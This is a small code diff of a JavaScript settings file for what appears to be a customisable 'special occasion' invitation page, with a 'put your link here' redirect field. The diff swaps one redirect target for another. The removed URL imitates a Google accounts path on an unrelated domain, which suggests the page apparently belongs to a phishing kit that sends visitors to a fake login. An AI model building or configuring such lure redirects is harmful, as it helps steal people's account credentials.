@@ -13,7 +13,7 @@
  */
 window.AURA_SETTINGS = {
   /** ← PUT YOUR LINK HERE (only edit this line for redirects) */
-  nextPageUrl: 'https://previteletterviews.com/july/accounts.google/',
+  nextPageUrl: 'https://deltone-design.com/spun/',
 
   /** Headline occasion text (replaces [special occasion]). */
   occasionTitle: 'special occasion',
